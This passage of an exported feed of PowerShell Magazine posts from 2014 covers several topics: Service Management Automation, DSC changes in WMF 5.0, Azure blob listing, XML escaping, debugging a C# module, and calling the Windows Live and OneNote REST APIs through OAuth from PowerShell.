Runbook Worker and web service installed:\nSource of illustration: System Center Orchestrator Engineering Team Blog\nAt the Build conference in April 2014 Microsoft also announced Microsoft Azure Automation preview, making it possible to leverage SMA without an on-premises automation platform.\nSummary Since SMA is based on PowerShell Workflow it’s possible to automate everything which can be accomplished from PowerShell. Unlike Orchestrator which can be extended by Integration Packs, SMA can be extended using PowerShell modules (they are called Integration Modules).\nThe first version of the product lacks some functionality available in Orchestrator, such as the ability to configure runbook permissions. This is a feature an enterprise using SMA would find useful in order to delegate access to runbooks based on, for example, Active Directory security groups.\nThere is no official statement regarding the strategy around co-existence of Orchestrator and SMA in the future, but it’s not unlikely that SMA will overtake Orchestrator’s role in the Microsoft ecosystem when more functionality comes in place.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/15/introduction-to-service-management-automation/","tags":["Service Management Automation"],"title":"Introduction to Service Management Automation"},{"categories":["PowerShell DSC"],"contents":"If you were under a rock and just came out, here is a bit of news for you. Microsoft released Windows Management Framework 5.0 preview that includes changes to DSC and a whole new feature called OneGet. We will talk more about OneGet some other time but I will list a set of changes to DSC I have been able to figure out.\nGet-DscResource is faster If you have ever used Get-DscResource in WMF 4.0 and you have a whole bunch of community resources to copy to your modules path, you can go and grab a coffee. Get-DscResource was SLOW! This is fixed in WMF 5.0. It just works! 🙂\nCredential property of Archive resource In the earlier article, I complained that the Archive resource must have a Credential property to make it easy for accessing UNC path. This is included in WMF 5.0. Now, we can write a simple configuration script to unpack a ZIP archive from a network share on to a target node. Easy! No need to use File resource as a intermediate step or assign computer account permissions.\n$ConfigurationData = @{ AllNodes = @( @{ NodeName=Server01 PSDscAllowPlainTextPassword=$true } ) } Configuration ArchiveDemo { param ( [Parameter(Mandatory=$true)] [ValidateNotNullOrEmpty()] [String]$Path, [Parameter(Mandatory=$true)] [PSCredential]$Credential, [Parameter(Mandatory=$true)] [String]$Destination ) Node $AllNodes.NodeName { Archive ArchiveDemo { Path = $Path Destination = $Destination Credential = $Credential } } } ArchiveDemo -ConfigurationData $configurationData -Path \u0026quot;\\\\Home-desk\\Test\\Videos.zip\u0026quot; -Credential (Get-Credential) -Destination C:\\Videos  As a best practice, you should try and deploy certificates when using Credential property of any DSC resource that supports it. Using the plain text password isn’t a secure way of transporting credentials.\nSet multiple file or folder attributes If you have used the File resource, you will know that the Attributes property, although a String array type, cannot really take multiple values. So, you can now set multiple file/folder attributes by using a single resource configuration.\nConfiguration FileDemo { Node Server01 { File FileDemo { DestinationPath = \"C:\\Scripts\\test.dll\" Attributes = \"System\",\"Hidden\" } } }  HTTPS URL for Package Path The Package resource in WMF 4.0 supported only HTTP URL for downloading an online MSI or EXE package for deployment. With the WMF 5.0 preview, the support for HTTPS download URLs is enabled.\nConfiguration PackageDemo { Node localhost { Package PackageDemo { Path = \u0026quot;https://psmag.blob.core.windows.net/downloads/7z920-x64.msi\u0026quot; Name = \u0026quot;7-Zip 9.20 (x64 edition)\u0026quot; ProductId = \u0026quot;23170F69-40C1-2702-0920-000001000000\u0026quot; } } } PackageDemo Yet another change in Package resource is the pre-validation for the ProductId of the MSI. In WMF 4.0, the ProductId is not validated until the package install is complete. With the WMF 5.0 preview, this is now changed. The new Get-MsiProductEntry in the Package resource module (this is not exported outside the module) is used to get the ProductId from MSI before starting the install. Also, providing an exact Product Name as the value of Name property is now mandatory.\nAnother change I have noticed but not explored is the DebugMode property in Local Configuration Manager (LCM). I will update this post as I discover more DSC goodness.\n[Update] Abhik from the PowerShell team posted a great overview of LCM DebugMode in WMF 5.0 preview.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/14/desired-state-configuration-changesfixes-in-wmf-5-0-preview/","tags":["PowerShell DSC"],"title":"Desired State Configuration changes/fixes in WMF 5.0 Preview"},{"categories":["Azure","Tips and Tricks"],"contents":"In the earlier article, I showed you how to deploy a Azure VM from VM depot. The VM depot has a public storage container where all the VHDs are stored as blobs. I was looking for a way to get a list of all blobs in a public container and had no luck with the Azure PowerShell cmdlets.\nI had approached Gaurav–good friend and an Azure MVP–and he showed me a way to do this using Azure Blob Service API. This is a simple and neat trick. The following code snippet shows how this can be done. For this example, we will use the VM depot community blob store URL (https://vmdepoteastus.blob.core.windows.net/linux-community-store/).\n$uri = \u0026quot;https://vmdepoteastus.blob.core.windows.net/linux-community-store/?comp=list\u0026amp;restype=container\u0026quot; $wc = New-Object System.Net.WebClient $xml = (($wc.DownloadString($uri))).EnumerationResults $xml.Blobs.Blob | ForEach-Object { New-Object -TypeName PSObject -Property @{ BlobName = $_.Name BlobUrl = $_.Url BlobType = $_.Properties.BlobType } } I tried using Invoke-RestMethod and Invoke-WebRequest. Both are returning invalid XML and therefore I am forced to use .NET WebClient. This is a simple way to explore what is there in an Azure storage container.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/10/pstip-listing-all-blobs-in-a-public-azure-storage-container/","tags":["Azure","Tips and Tricks"],"title":"#PSTip Listing all blobs in a public Azure storage container"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen authoring XML documents, some of the data you will use in your tags are considered invalid. For example, you might want to include an ampersand character in one of the tags:\n\u0026lt;Tag\u0026gt;\u0026 $foo\u0026lt;/Tag\u0026gt;  However, the \u0026amp; character is invalid and using it as is will generate an exception. Instead, we need to replace it with its escaped equivalent. The following table lists the characters that needs to be escaped.\n   Invalid character Replace with     \u0026lt; \u0026lt;   \u0026gt; \u0026gt;   “ \u0026quot;   ‘ '   \u0026amp; \u0026amp;    Making sure a character is not invalid by looking at the value of a string is not that difficult but what if you don’t have control over the value or the content of the tag is passed via a variable? This is where the SecurityElement.Escape method comes into play. Similarly to the Regex.Escape method, SecurityElement.Escape lets you replace invalid characters with their valid values. \nPS\u0026gt; $var = '\u0026amp; $foo' PS\u0026gt; [System.Security.SecurityElement]::Escape($var) \u0026amp; $foo ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/09/pstip-replacing-invalid-xml-characters/","tags":["Tips and Tricks"],"title":"#PSTip Replacing invalid XML characters"},{"categories":["How To"],"contents":"In this second part of the series on writing PowerShell modules in C#, we will cover how to enable basic debugging features in our module. We will cover how to set up a project in both the Express and commercial versions of Visual Studio 2013. We will also cover the basics of setting a breakpoint in our code and how we can step through the code, look at the content of the variables, and trace the execution path our code takes so that we can validate its logic.\nDebug Setup The code we will use to practice debugging is a bit more complicated than the basic code we used in part one. The Visual Studio Project can be downloaded from https://github.com/darkoperator/IPHelper. The project is for a module called IPTool with two cmdlets at this moment; they are:\n Get-IPRange – Generates a list of IP address objects for a given network either by providing CIDR notation or start and end IP for the range. Invoke-ARPScan – Performs an ARP request for every IP address in an IPv4 range provided either a CIDR notation or the start and end IP address for the range.  In addition to the two classes that inherit from the PSCmdlet class, there is another class called IPTool that is used for turning an IP Address to an integer and for getting the hosts count for a specified network range.\nTypically when developing a library inside of Visual Studio, one would link the library to a main project and the project would in turn load the library to allow us to debug the code and be able to control the execution. In the case of PowerShell, we need to load the library in a PowerShell process to be able to debug it. Depending on the version of Visual Studio, this can be setup automatically or manually.\nSetting Up Debugging in Visual Studio 2013 (Ultimate, Premium, and Professional) The commercial versions of Visual Studio allow us to call an external program and pass parameters to it. This feature allows us to launch PowerShell with the arguments to load the built module so that we can start debugging it. We start by going to the project properties by right-clicking on the project name inside the Solution Explorer pane or pressing Alt + Enter.\nIn the properties window, select Debug tab and select Start external program under Start Options. Navigate to PowerShell.exe for the architecture of your project. In the Start Options -\u0026gt; Command Line Arguments textbox, enter the parameters for the PowerShell executable that will automatically load the module once it is compiled. The debugger starts always in the default location where the DLL is generated. So, there is no need to specify the full path. In the case of our module the option would be:\n-noexit -command \u0026quot;\u0026amp;{ import-module .\\IPHelper.dll -verbose}\u0026quot; Your debug options should look like:\nWe now click on the Save button in the toolbar and when we start the project in debug mode it should open a PowerShell process and load our module:\nSetting Up Debugging in Visual Studio 2013 Express In the case of Visual Studio Express, we do not have the same options available to us in the GUI to setup debugging in the same way we do in the commercial versions of Visual Studio. We have two options for debugging using the Express edition:\n Start a Process that we will attach to, load the module and execute the command we want to debug. Create a Visual Studio project user options file by hand to execute PowerShell and load the module every time we run the project in debug mode.  Attaching to a Process The first option is to start PowerShell manually, select DEBUG from the menu and select Attach to Process.\nFrom the list of processes select the powershell.exe process that does not have the module loaded and click on Attach.\nOnce attached you can navigate to the folder where the assembly for the module is located and load it to run the command you wish to debug.\nCustom Visual Studio Project User Options File In Visual Studio Express, inside the project folder, we can create a file with the same name as our project with an extension of csproj.user. This file contains the user-defined options for the project. The actions are defined in XML following the MSBuild Schema http://msdn.microsoft.com/en-us/library/0k6kkbsd.aspx. In our case, the content of this file would look like:\n\u0026lt;?xml version=\"1.0\" encoding=\"utf-8\"?\u0026gt; \u0026lt;Project xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u0026gt; \u0026lt;PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' \"\u0026gt; \u0026lt;StartAction\u0026gt;Program\u0026lt;/StartAction\u0026gt; \u0026lt;StartProgram\u0026gt;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026lt;/StartProgram\u0026gt; \u0026lt;StartArguments\u0026gt;-noexit -command \"\u0026amp;{ import-module .\\IPHelper.dll -verbose}\"\u0026lt;/StartArguments\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;/Project\u0026gt;  We create a property group with the condition that would trigger the action. In our example, it would be to start debugging with a target of AnyCPU and specify what program to start and the arguments it should process. You will notice that, since this is an XML file, we represented the ampersand character differently so as to follow proper XML formatting.\nNow when we start to debug, it will launch PowerShell with the command arguments specified allowing us to debug the module.\nDebugging Commands When we are debugging an application in Visual Studio, our code will be in two states. It will either be running or in a break state. In the break state, the execution is stopped either by an exception or the execution hit a breakpoint we specified inside the code. The advantage of the code being in a break state is that we get access to what is called the state of the application which is composed of functions, variables and objects present in memory at the time the application entered the break state.\nThe most commonly used method for entering break state is by setting a breakpoint in our code. The two most common ways to set a breakpoint are by moving the cursor to the line we want to break in and press the F9 key or by clicking on the grey area to the left. Once a breakpoint is set the line of code will turn a dark brown color.\nVisual Studio provides some great flexibility when it comes to when a breakpoint forces an application into break state. By right clicking on the red ball icon that appears on the grey bar of the editor, we get the options that can be set.\nSince the article is based on the basics, we will not go into each of the options that can be set but I recommend that you to read this information at http://msdn.microsoft.com/en-us/library/5557y8b4.aspx\nWe can set more than one breakpoint in our application if we need to. Once we have set the breakpoints, we can start the debugging process by pressing the F5 key or clicking on the green start triangle with the action set to debug.\nFor this example, we will set the breakpoint on line 182 of our project and start the debug process. The first thing we will notice is that Visual Studio window changed and it has orange border in the button and two new view panes appear.\nTo hit the breakpoint, we need to execute the Invoke-ARPScan cmdlet where the breakpoint resides in the PowerShell session our debugger is attached to. I will use the CIDR notation and specify a small range of IP addresses to test.\nInvoke-ARPScan -CIDR 192.168.1.1/30  Execution will appear to be halted in our PowerShell session window and this is normal since it should be in a break state. In Visual Studio window, we will see that the active breakpoint, where the application entered the break state, is highlighted in yellow and the icon for the breakpoint is changed to a yellow arrow inside a red icon.\nIn the Locals pane, we can see the variables, their content and type. We can modify the content of a variable in memory by double-clicking on the value. We can also see the Call Stack pane and where in the stack the code execution state.\nTo step through the code, we can use the Debug Toolbar buttons or the keyboard.\n   Menu Command Keyboard Shortcut Description     Step Into F11 If the line contains a function call, Step Into executes only the call itself, then halts at the first line of code inside the function. Otherwise, Step Into executes the next statement.   Step Over F10 If the line contains a function call, Step Over executes the called function, then halts at the first line of code inside the calling function. Otherwise, Step Into executes the next statement.   Step Out Shift+F11 Step Out resumes execution of your code until the function returns, then breaks at the return point in the calling function.    If we click on the Step Into menu item or press the F11 key, we can see that we are now in the GetMacAddress method of the PSCmdlet class and the call stack now reflects our new position inside the class. Our variable list is now updated to show only the variables inside the scope we are in which is the method.\nIf we click on the Step Out menu button or press the Shift+F11 key combination, we will finish the execution of that method and move out of it and back into the ProcessRecord() method of the PSCmdlet class.\nWe can now issue the debug commands for Step Over and Step Into and see how the code execution progresses. We can see how each step creates and sets the values of the object and the results are shown in the PowerShell session.\nWe can Stop Debugging by clicking on the Stop icon in the debug toolbar or pressing the Shift+F5 key combination. If we want to restart debugging for any reason, we can click on the Restart Debugging icon on the debug toolbar or pressing the Crtl+Shift+F5 key combination.\nAs we can see debugging allows us to see step by step what is happening in our application and the contents of the memory used by it allow us to determine where a bug is present. It also allows us to modify the contents of variables by double clicking on the value and entering a new one of modifying the existing one giving us further control on the debugging process.\nThe workflow of debugging is pretty much similar to the one we would do in ISE or from a PowerShell session using Cmldets only differing in the interfaces used .\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/08/basics-of-writing-a-powershell-module-with-c-part-2-debugging/","tags":["Modules","How To","PSCmdlet"],"title":"Basics of Writing a PowerShell Module with C#, Part 2: Debugging"},{"categories":["How To"],"contents":"Microsoft has recently unveiled a REST API for OneNote Live, and since PowerShell has had cmdlets for working with REST services since V3 was introduced it seems like a good opportunity to look at the Live APIs and how they can be called from PowerShell.\nREST is not a protocol, but a design philosophy, every call to the API is self-contained – i.e. servers don’t maintain user sessions. Anything which calls the REST APIs for OneNote, OneDrive or other Windows Live services must authenticate using OAuth on each action.\nAuthenticating We often think of authentication as proving to a system that we were on a list of approved users, and maybe the server offered some proof it wasn’t an imposter. OAuth solves a problem which didn’t really exist before cloud services: imagine that a web site you use offers to post for you on social media sites when you do something interesting. Should you give it your credentials so it can log in as if it were you? Would they be secure and manageable? Do you trust the service to only do what it said, and not mine your contacts list without asking? How can give a specified service (or any software) to limited rights for an open ended period of time? That’s where Oauth comes in.\nThe software/service which acts for the user must register as a “consumer” of ID information: it is given ID and a “secret”. Then it can send the user to get a token; it uses the token whenever it works with a server on the user’s behalf. The token identifies the user and the things which they have agreed the consumer can do on their behalf. If the user ceases to trust the consumer, they tell the server not to accept the token anymore. In simplified from, the process looks like this.\n  The Service which needs permission- the “consumer” – will put up a page with a link the user can click to allow it to carry out some action on another server.\n  The link contains a callback URL, a service ID and (usually) the permissions sought\n  The server granting permission will check the service ID and ask the user “Are you sure you want to allow this service to do these things for you?” If the user agrees, a token is generated. But if the token were issued at this point, anything could grab the service ID and masquerade as that service, so.\n  The token is stored and the user is redirected to the callback URL which has parameters added to say how to fetch the token\n  The consumer requests the token, and to prove it is the rightful user of the service ID includes its secret in the request.\n  The server releases the token to the consumer.\n  From now on the consumer can send requests with the token. The token identifies the user and proves they delegated some permission to the consumer.\n  For some services the token remains valid indefinitely, unless the user cancels it. Others – including Windows Live – issue tokens which expire after a short time, but also allow the consumer to request a fresh token without asking the user’s approval.\nSo let’s have a look at how this works with Windows Live and how we might use it from PowerShell.\nStep 1 is to go to https://account.live.com/developers/applications/index–there is a different link for Windows 8.1 store applications, but for everything else this is the page to register an application: Click “Create Application” and follow the instructions. You can get back to the ID and Secret if you need to but for now make sure you have a copy saved and pop them into a new PowerShell script.\n$ClientID = \"000000001D1D1D1D\" $Secret = \"53cRET53cRET53cRET53cRET5EcReTSe\"  Now we have a problem to solve. Live.com wants to use a web page to ask the user’s to approve the issuing of a token. And we’re in PowerShell not in a browser. Fortunately this problem has already been solved for us. Firstly Live provides a readymade callback URL https://login.live.com/oauth20_desktop.srf so anything which can show a web browser can redirect there. So we can build the request URL (in step 2 of the diagram like this.\n$wlCallBackUri = \"https://login.live.com/oauth20_desktop.srf\" $wlAuthUri = \"https://login.live.com/oauth20_authorize.srf?\"+ \"client_id=$ClientID\"+ \"\u0026scope={0}\"+ \"\u0026response_type=code\" + \"\u0026redirect_uri=$wlCallBackUri\"  The Authentication URI has these parameters.\n Redirect URI – the page to go to after the user logs on Client ID – the ID for the application Response type – it is possible to ask for the token if we are going to perform a single operation but here we want a code, which will give us a renewable token. Scopes. What will our application want to do? There is long list, and this will appear when the browser page pops up. For now there is a place holder {0} so we can insert the scopes later using the –f format operator  There is a long list of scopes at http://msdn.microsoft.com/en-us/library/live/hh243646.aspx most of the things were likely to want to do from PowerShell can be achieved with the following ones:\n$Scope = @(\"wl.offline_access\", \"wl.signin\", \"wl.basic\", \"wl.emails\", \"wl.calendars_update\", \"wl.contacts_create\", \"wl.skydrive_update\", \"Office.onenote_create\")   wl.signin Signing with MS account signs into the app wl.offline_access The ability to work even if when isn’t signed into Live wl.basic View user’s name, gender, avatar, contacts and friends wl.emails Access your own emails wl.skydrive_update Read from and write to OneDrive Office.onenote_create Add OneNote pages (but not view or edit existing ones) wl.calendars_update View and update your calendars wl.contacts_create Add to your Contacts list  Having setup the scopes it’s easy to put them into the authentication URI like this,\n($wlAuthUri -f ($Scope -join \u0026quot;%20\u0026quot;)) One important thing to note is that the scopes are granted cumulatively: if an application requests access to Contacts and then later requests Calendar access, the user will be asked “do you want to give it access to Contacts and Calendars”.\nBuilding a mini web browser as a Windows form in PowerShell So, we have the URI we want–now it’s just question of getting it to appear in a web browser and getting the result back to PowerShell. Fortunately this problem has been solved; the code below is based on some from the Scripting Guys Blog\nAdd-Type -AssemblyName System.Windows.Forms $form = New-Object -TypeName System.Windows.Forms.Form -Property @{ Width=440;Height=640} $web = New-Object -TypeName System.Windows.Forms.WebBrowser -Property @{ Width=420;Height=600;Url=($wlAuthUri -f ($Scope -join \u0026quot;%20\u0026quot;)) } $DocComp = { $Global:uri = $web.Url.AbsoluteUri if ($Global:Uri -match \u0026quot;error=[^\u0026amp;]*|code=[^\u0026amp;]*\u0026quot;) {$form.Close() } } $web.Add_DocumentCompleted($DocComp) $form.Controls.Add($web) $form.Add_Shown({$form.Activate()}) $form.ShowDialog() | Out-Null This starts by defining a form and a WebBrowser control: the browser is just wide enough to hold the page that Windows Live returns and a scrollbar (the scrollbar will be needed if there are many scopes listed) and the form is just a little bigger.\nThen a script block is defined which is run when the WebBrowser control finishes loading a document. This saves the URI to a global variable, and if is either an error or contains the code the form is closed. Since the browser may go via other pages on the way to getting the code this check is important.\nControl returns to the script in one of three cases:\n The user just closes the form. The user Clicks “No” and error is returned. The user Clicks “yes” and a code is returned.  Using Invoke-RestMethod This code will be in $URI. The following section uses the Invoke-RestMethod cmdlet, to fetch and process the token.\nThis cmdlet needs four parameters, the HTTP method (POST in this case), the URI to POST to, the content type of the body and the body itself– which contains the App ID, the Secret and the Code.\nif ($Uri -match \u0026quot;code=([^\u0026amp;]*)\u0026quot;) { $wlTokenUri = \u0026quot;https://login.live.com/oauth20_token.srf\u0026quot; $wlTokenBody = \u0026quot;client_id=$ClientID\u0026amp;client_secret=$Secret\u0026quot; + \u0026quot;\u0026amp;redirect_uri=$wlCallBackUri\u0026quot; + \u0026quot;\u0026amp;grant_type=authorization_code\u0026amp;code=\u0026quot; + $Matches[1] $response = Invoke-RestMethod -Method Post -Uri $wlTokenUri -Body $wlTokenBody` -ContentType \u0026quot;application/x-www-form-urlencoded\u0026quot; $wlAccess = $Response.access_token $wlScope = $Response.scope -split \u0026quot;\\s+\u0026quot; $wlRefresh = $Response.refresh_token $wlExpiry = (Get-Date).AddSeconds([int]$Response.expires_in -10 ) } Invoke-RestMethod builds the HTTP request and processes the body that is returned. Live.com will return either 3 or 4 fields.\n Access_token is the token to use in all the subsequent calls to the services. Scope. Scopes accumulate. If the user has already granted Calendar access, to this application, and this request is for OneNote access, the user will be asked if they want to give Calendar AND OneNote Access. If they agree the full list of scopes is returned. Expires_in is the number of seconds for which the token is valid. Since there is no time given, this is only useful if we convert it to an expiry time – I subtract a few seconds to make sure that the token is always refreshed before it times out. If the request is includes the off line access scope there is also a Refresh_token. This is used in a very similar way to the initial code, just building a different token body.  $wlTokenBody = \"client_id=$ClientID\u0026client_secret=$Secret\" + \"\u0026redirect_uri=$wlCallBackUri\" + \"\u0026grant_type=refresh_token\u0026refresh_token\" + $wlRefresh  The final code I built implements a function Use-WindowsLive which saves the response to an XML file using the Export-Clixml cmdlet, and puts all the parts of the response into global variables. The function takes an optional -Scope parameter and looks to see if there is an Access token with time left, or a refresh token that can be used to get a new access token or if it can’t find either it looks for a XML file and imports the refresh token and then processes that. User approval is only needed if neither token can be found or if new scopes are requested.\nCalling the Live Rest APIS Once the PowerShell has a token it can start making REST calls to live services, and it would be useful to find out which user’s information the script is working with. This involves another call to Invoke‑RestMethod The same base URI is used for many calls:\n$wlApiUri = \u0026quot;https://apis.live.net/v5.0\u0026quot; Invoke-RestMethod -Uri \u0026quot;$wlApiUri/me?access_token=$wlAccess\u0026quot; id : 1exxxxxxxxx17 name : James O'Neill first_name : James last_name : O'Neill link : https://profile.live.com/ gender : emails : @{preferred=xx@xxx.com; account=xx@xxx.com; personal=; business=} locale : en_GB updated_time : 2014-03-22T17:09:54+0000 So it would be simple to store the name like this\n$wlUser = (Invoke-RestMethod -Uri \"$wlApiUri/me?access_token=$wlAccess\").name  Working with OneDrive This pattern of calling Invoke‑RestMethod with a URI of https://apis.live.net/v5.0/SOMETHING?accesstoken=The_Access_Token\nis repeated many times. For example we can get information about the space available to the user by calling\nInvoke-RestMethod -Uri \u0026quot;$wlApiUri/me/skydrive/quota?access_token=$wlAccess\u0026quot; quota available ----- --------- 30064771072 27532934454 We can discover information about the user’s OneDrive (the API still uses the old name “SkyDrive”) with\nInvoke-RestMethod -Uri \"$wlApiUri/me/skydrive?access_token=$wlAccess\"  This returns a lot of properties but the most useful one is upload_location, which looks like:\nhttps://apis.live.net/v5.0/folder.1exxxxxxxxx17/files/ so this can be stored for later use\n$skydriveRoot = (Invoke-RestMethod –Uri ` \"$wlApiUri/me/skydrive?access_token=$wlAccess\" ).upload_location  I think it is more reliable to look up the path than to try to build it from the userID. The upload location looks like another URI that can be called with Invoke‑RestMethod with the addition of the access token:\nInvoke-RestMethod -Uri \"$skydriveRoot`?access_token=$wlAccess\"  returns an array property named “data”, which contains an object for each item in the root folder of the user’s OneDrive . The list of objects can be shortened: for example adding a parameter of filter=albums,folders just the containers (other choices are photos, videos, audio, folders, or albums)\n$skydriveFolders = (Invoke-RestMethod –Uri` \u0026quot;$skydriveRoot`?access_token=$wlAccess\u0026amp;filter=albums,folders\u0026quot;).data Write-Host (\u0026quot;$wlUser has \u0026quot; + $skydriveFolders.Count + \u0026quot; OneDrive root folders\u0026quot;) I wrote a format XML file so I could neatly display the items returned. There is more on the OneDrive APIs on MSDN at http://msdn.microsoft.com/en-us/library/live/hh826521.aspx\nI created functions for Get-OneDrive (which gets the items for the root or a specified path) , Copy-OneDriveItem (to the local computer) and Copy-ToOneDrive (from the local computer).\nCopying TO OneDrive uses the PUT HTTP method, if $path points to a file and $URI contains an Upload location it is invoked like this\nInvoke-RestMethod -Uri $Uri -Method Put -InFile $Path  Copying FROM OneDrive puts /content into the URI after the ID and is invoked like this:\nInvoke-RestMethod -Uri \"$wlApiUri/$id/content?access_token=$wlAccess\" -OutFile $outFile  Deleting from OneDrive uses the DELETE HTTP method, for example\nInvoke-RestMethod -Method Delete -Uri \"$wlApiUri/$id`?access_token=$wlAccess\"  Creating a OneDrive folder is a little different: it needs a piece of JSON to describe the folder to be created – PowerShell provides cmdlets to convert to and from JSON so that’s easy. Posting to a URI creates a folder, and it command is invoked with the Access Token in a header, not in in the URL\n$myBody = @{name=$name} | ConvertTo-Json Invoke-RestMethod -Method Post -Uri \"$wlApiUri/$id\" ` -Headers @{\"Authorization\" = \"Bearer \" + $wlAccess} ` -ContentType \"application/json\" -Body $myBody  Live provides APIs to create contacts and calendar events – which aren’t of great interest to me as I rely on Exchange \u0026amp; Outlook to deal with those. But OneNote is much more interesting.\nUsing the OneNote Live API The OneNote Live API uses the techniques we’ve already seen to post an HTML body to a REST URL\n$wlOneNoteURI = \"https://www.onenote.com/api/v1.0/pages\" Invoke-RestMethod -Method Post -Uri $wlOneNoteURI ` -Headers @{\"Authorization\" = \"Bearer \" + $wlAccess} ` -ContentType \"text/html\" -Body $myhtml  It’s pretty much the same as adding a folder except that the JSON describing the folder has been replaced with a larger piece of HTML.\nI have found that I can build more complex pages than the OneNote Live site can render successfully, but I have not drilled into exactly what the problem is I can open these pages in OneNote on my phone or PC but it crashes one of the scripts that runs on the page.\nIt seemed like a good idea to support everything that ConvertTo-Html can do so I built an “Out-OneNoteLive function with the same parameters\nFunction Out-OneNoteLive { Param ( [parameter(ValueFromPipeline=$true)] [psobject]$InputObject, [Parameter(Position=0)] [System.Object[]]$Property, [string[]]$Body, [Parameter(ParameterSetName='Page', Position=1)] [string[]]$Head, [Parameter(ParameterSetName='Page', Position=2)] [ValidateNotNullOrEmpty()][string]$Title, [ValidateSet('Table','List')][string]$As = 'Table', [Parameter(ParameterSetName='Fragment')] [ValidateNotNullOrEmpty()][switch]$Fragment, [ValidateNotNullOrEmpty()][string[]]$PreContent, [ValidateNotNullOrEmpty()][string[]]$PostContent ) Begin { $stuff = @() } Process { $Stuff = $Stuff + $InputObject} End { if (Use-WindowsLive -Scope \u0026quot;wl.basic\u0026quot;, \u0026quot;Office.onenote_create\u0026quot;) { if (-not $Title) { $PSBoundParameters.Add(\u0026quot;Title\u0026quot;,( $MyInvocation.Line + \u0026quot; - \u0026quot; + (Get-Date))) } [void]$PSBoundParameters.Remove(\u0026quot;InputObject\u0026quot;) $myhtml = $Stuff | ConvertTo-Html @PSBoundParameters $result = Invoke-RestMethod -Method Post -Uri $wlOneNoteURI -Headers @{\u0026quot;Authorization\u0026quot; = \u0026quot;Bearer \u0026quot; + $wlAccess} -ContentType \u0026quot;text/html\u0026quot; -Body $myhtml $result.links.onenoteWebUrl.href } } }  To save time I used the method for building proxy commands to get a partial script with the parameter block which I could paste into an editor\n$cmd = Get-Command ConvertTo-Html $MetaData = New-Object System.Management.Automation.CommandMetaData ($cmd) [System.Management.Automation.ProxyCommand]::create($MetaData) | clip  The Begin block creates a new array, and the process block adds items piped into the cmdlet to the array. Then I need to call ConvertTo-Html; I modify the bound parameters, adding a title if there isn’t one and removing any input object and then I pipe whatever was input to the function to ConvertTo-Html using splatting to put in the other parameters. Once I have the HTML body it is simply a question of calling Invoke-RestMethod, looking at the result for the URI that was created and returning it.\nAt the time of writing the OneNote API is still looking a little bit short of features; you can follow as features are added via the teams blog http://blogs.msdn.com/b/onenotedev/ ; MSDN has the documentation for the API at http://msdn.microsoft.com/en-us/library/office/dn575420(v=office.15).aspx\nCombining the parts as a module I combined the Format file and script into a “Live” module which you can get from http://1drv.ms/1hcygmH\nEnjoy\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/07/using-the-windows-live-apis-from-powershell/","tags":["How To"],"title":"Using the Windows Live APIs from PowerShell"},{"categories":["News"],"contents":"While the PowerShell community is still looking at the Desired State Configuration feature in PowerShell 4.0, Windows Server team already announced the preview release of Windows Management Framework 5.0.\nThe major addition announced in this preview release is the Windows PowerShell OneGet framework to discover and install software packages from around the web.\nIn addition to the OneGet framework, the WMF 5.0 preview release also include NetworkSwitch module for managing standards compliant network switch hardware using PowerShell cmdlets.\nYou can download this preview release from the Microsoft download center.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/03/windows-management-framework-5-0-preview-is-here/","tags":["News"],"title":"Windows Management Framework 5.0 preview is here!"},{"categories":["News"],"contents":"Not completely yet. But, the Visual Studio 2013 Update 2 RC release seems to be a step in that direction. This update includes PowerShell syntax highlighting in the Visual Studio Editor.\nWe still cannot select and add a PowerShell script as an item. Instead, I selected a text file and named it as .ps1 file.\nThe syntax highlighting is a feature built into the product and not an extension or add-on. So, I don’t see a reason why this won’t be available in the Express edition of Visual Studio.\nPowerShell script debugging and IntelliSense are on top of my wish list for Visual Studio. I’d love to see other features such as ability to author script modules as a Visual Studio solution etc. These features may already be on their way into the product. Until then, I will go back to Windows PowerShell ISE!\nYou can download the VS 2013 Update 2 RC from Microsoft download center.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/03/is-native-windows-powershell-support-coming-to-visual-studio/","tags":["PowerShell","Visual Studio"],"title":"Is native Windows PowerShell support coming to Visual Studio?"},{"categories":["PowerShell DSC","Azure"],"contents":"I had described in an earlier article that Desired State Configuration requires WinRM listeners for pushing the configuration to target systems. By default, WinRM is configured to listen on ports 5985 (HTTP) and 5986 (HTTPS). When deploying Windows VMs on Azure, you will find that the default WinRM listener is SSL (HTTPS) based and has a random public port number assigned to it. We use the Cloud Service DNS name along with the random port number assigned to the WinRM HTTPS listener.\nFor example, here is one of the Azure VMs I created. This is running Windows Server 2012 R2 and has the WinRM HTTPS listener created.\nThis is it for now. In a later article, I will show how to deploy HTTP listeners and use them for pushing DSC configuration.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/02/pushing-desired-state-configuration-to-an-azure-vm/","tags":["Azure","PowerShell DSC"],"title":"Pushing DSC configuration to an Azure VM"},{"categories":["PowerShell DSC"],"contents":"Windows PowerShell Desired State Configuration feature depends on PowerShell remoting. This is what we have been hearing and reading in the WMF 4.0 release notes too! Right?\nIt is a myth. Thanks to Aleksandar for shedding light on this. This is a myth like the other one that says we need PowerShell remoting for CIM cmdlets to work. CIM cmdlets and DSC just need the WinRM listeners and not PS remoting. The WinRM listeners are a requirement for DSC and PowerShell remoting creates them. This makes people think that PowerShell remoting is a requirement for DSC to work. Let us understand this in detail by looking at an example.\nWe will first go through the process of creating WinRM listeners and then make sure that we disable remoting. We, then, see how DSC configuration push just works without enabling PowerShell remoting on a target system. For this demo purpose, I chose Windows 8.1 x64 OS as the target OS. This system is joined to a domain and has Windows Remote Management disabled, by 